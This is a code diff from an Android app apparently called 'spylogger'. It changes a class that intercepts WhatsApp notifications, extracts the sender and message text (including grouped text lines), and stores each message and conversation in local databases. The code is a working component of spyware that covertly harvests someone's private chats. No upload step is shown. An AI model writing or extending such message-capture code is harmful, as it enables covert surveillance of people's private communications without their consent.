@@ -2,10 +2,12 @@ package com.gravatasufoca.spylogger.helpers;
 
 import android.app.Notification;
 import android.content.Context;
-import android.os.Bundle;
 import android.service.notification.StatusBarNotification;
+import android.util.Log;
 
-import com.gravatasufoca.spylogger.vos.ContatoVO;
+import com.gravatasufoca.spylogger.model.Mensagem;
+
+import java.sql.SQLException;
 
 /**
  * Created by bruno on 04/06/17.
@@ -19,17 +21,30 @@ public class WhatsNotificationAdd extends MensagemNotificacao {
 
     @Override
     protected void add() {
-        Bundle extras = getSbn().getNotification().extras;
-        ContatoVO contato=getContato(extras.get("android.people")!=null?((String[]) extras.get("android.people"))[0]:null);
+       /*
+       quando tem o contato, quer dizer que foi a primeira notificacao do grupo.
+       quando nao tem o contato, quer dizer que faz parte do grupo e eh a primeira mensagem. Neste caso eu devo percorrer o grupo e pegar a mensagem com a tag!=null (tag eh o key do whats)
+       nesta notificacao o android.textLine traz todas as mensagens.
+        */
+        Mensagem mensagem=getMensagem();
 
-        String title = extras.getString(Notification.EXTRA_TITLE);
-        String text = extras.getCharSequence(Notification.EXTRA_TEXT).toString();
-            /*
-            quando tem o contato, quer dizer que foi a primeira notificacao do grupo.
-            quando nao tem o contato, quer dizer que faz parte do grupo e eh a primeira mensagem. Neste caso eu devo percorrer o grupo e pegar a mensagem com a tag!=null (tag eh o key do whats)
-            nesta notificacao o android.textLine traz todas as mensagens.
-            Descobrir como o textLine eh, verificar se sera possivel extrair mensagem por mensagem
-             */
+        if(mensagem!=null){
+            try {
+                getRepositorioTopico().inserirOuAtualizar(mensagem.getTopico());
+                getRepositorioMensagem().inserirOuAtualizar(mensagem);
+            } catch (SQLException e) {
+                Log.d("spylogger",e.getMessage());
+            }
+        }
+
     }
 
+    @Override
+    protected String getTexto() {
+        if(getSbn().getNotification().extras.get(Notification.EXTRA_TEXT_LINES)!=null) {
+            String[] tmp = (String[]) getSbn().getNotification().extras.get(Notification.EXTRA_TEXT_LINES);
+            return tmp[tmp.length-1];
+        }
+        return getMsgInfo(Notification.EXTRA_TEXT);
+    }
 }
